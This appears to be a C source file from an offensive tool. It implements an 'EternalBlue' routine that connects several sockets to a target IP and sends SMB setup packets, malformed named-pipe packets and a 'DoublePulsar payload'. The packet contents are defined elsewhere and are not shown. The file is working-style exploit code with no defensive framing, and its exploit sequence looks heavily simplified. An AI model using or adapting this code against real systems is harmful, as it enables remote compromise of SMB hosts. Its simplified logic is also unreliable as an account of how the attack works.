#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"

#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static int eternalblue_send_all(int sock, const void *data, size_t length)
{
    const unsigned char *bytes = data;
    size_t sent = 0;

    while (sent < length) {
        ssize_t result = send(sock, bytes + sent, length - sent, MSG_NOSIGNAL);
        if (result < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int eternalblue_send_chunked(int sock, const void *data, size_t length)
{
    const unsigned char *bytes = data;
    size_t offset = 0;
    size_t chunk_size = (size_t)SMB_CHUNK_SIZE;

    if (chunk_size == 0)
        return -1;

    while (offset < length) {
        size_t chunk = length - offset;
        if (chunk > chunk_size)
            chunk = chunk_size;
        if (eternalblue_send_all(sock, bytes + offset, chunk) < 0)
            return -1;
        offset += chunk;
    }

    return 0;
}

int EternalBlue(const char *ip, int port)
{
    int sockets[NUM_SOCKETS];
    struct sockaddr_in address;
    int result = -1;

    for (int i = 0; i < NUM_SOCKETS; i++)
        sockets[i] = -1;

    if (ip == NULL) {
        printf("EternalBlue: invalid IP address\n");
        return -1;
    }

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((unsigned short)port);
    if (inet_pton(AF_INET, ip, &address.sin_addr) != 1) {
        printf("EternalBlue: invalid IP address: %s\n", ip);
        return -1;
    }

    for (int i = 0; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: opening and connecting socket %d to %s:%d\n",
               i, ip, port);
        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (sockets[i] < 0) {
            printf("EternalBlue: failed to open socket %d\n", i);
            goto cleanup;
        }
        if (connect(sockets[i], (struct sockaddr *)&address,
                    sizeof(address)) < 0) {
            printf("EternalBlue: failed to connect socket %d\n", i);
            goto cleanup;
        }
    }

    for (int i = 0; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: sending SMB negotiate packet on socket %d\n", i);
        if (eternalblue_send_all(sockets[i], SMB_NEGOTIATE_PKT,
                                 sizeof(SMB_NEGOTIATE_PKT)) < 0)
            goto cleanup;

        printf("EternalBlue: sending SMB session setup packet on socket %d\n", i);
        if (eternalblue_send_all(sockets[i], SMB_SESSION_SETUP_PKT,
                                 sizeof(SMB_SESSION_SETUP_PKT)) < 0)
            goto cleanup;

        printf("EternalBlue: sending SMB tree connect packet on socket %d\n", i);
        if (eternalblue_send_all(sockets[i], SMB_TREE_CONNECT_PKT,
                                 sizeof(SMB_TREE_CONNECT_PKT)) < 0)
            goto cleanup;
    }

    printf("EternalBlue: sending malformed named-pipe packets on socket 0\n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (eternalblue_send_chunked(sockets[0], SMB_TRANS_NAMED_PIPE_PKT,
                                     sizeof(SMB_TRANS_NAMED_PIPE_PKT)) < 0)
            goto cleanup;
    }

    for (int i = 2; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: sending DoublePulsar payload on socket %d\n", i);
        if (eternalblue_send_chunked(sockets[i], DP_EXEC_PKT,
                                     sizeof(DP_EXEC_PKT)) < 0)
            goto cleanup;
    }

    result = 0;

cleanup:
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (sockets[i] >= 0) {
            printf("EternalBlue: closing socket %d\n", i);
            if (close(sockets[i]) < 0) {
                printf("EternalBlue: failed to close socket %d\n", i);
                result = -1;
            }
            sockets[i] = -1;
        }
    }

    return result;
}